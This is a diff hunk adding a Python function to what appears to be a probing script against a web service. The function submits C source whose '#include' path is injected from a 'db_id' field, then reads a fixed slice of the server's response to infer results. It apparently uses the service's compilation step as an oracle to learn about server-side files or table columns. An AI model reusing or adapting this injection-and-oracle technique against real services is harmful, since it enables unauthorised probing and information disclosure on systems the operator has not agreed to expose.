@@ -63,6 +63,38 @@ def submit(dic, s):
         return 1
     return 0
 
+def getColumn(dic):
+    s = "a"
+    form = submit_form
+    part0 = '#include \"' + dic["db_id"] + '\"\n#include <stdio.h>\n\nint main() {\n\tputs(\"'
+    part1 = '\");\n\treturn 0;\n}'
+    dic["script_source"] = part0 + s + part1
+    s = str(dic)
+    s = s.replace('"', '\\\"')
+    s = s.replace("'", '"')
+    form["table_data"] = "[[" + s + "]]"
+    r = session.post(submit_url, data = form, headers = headers)
+    s = str(r.text)
+    if s[100:106] != "\\u5217":
+        return 1
+
+    s = "a\\ta"
+    form = submit_form
+    part0 = '#include \"' + dic["db_id"] + '\"\n#include <stdio.h>\n\nint main() {\n\tputs(\"'
+    part1 = '\");\n\treturn 0;\n}'
+    dic["script_source"] = part0 + s + part1
+    s = str(dic)
+    s = s.replace('"', '\\\"')
+    s = s.replace("'", '"')
+    form["table_data"] = "[[" + s + "]]"
+    r = session.post(submit_url, data = form, headers = headers)
+    s = str(r.text)
+    if s[100:106] != "\\u5217":
+        return 2
+
+    return 3
+    
+
 def check(dic):
     s = "check!!!!!!!!"
     form = submit_form
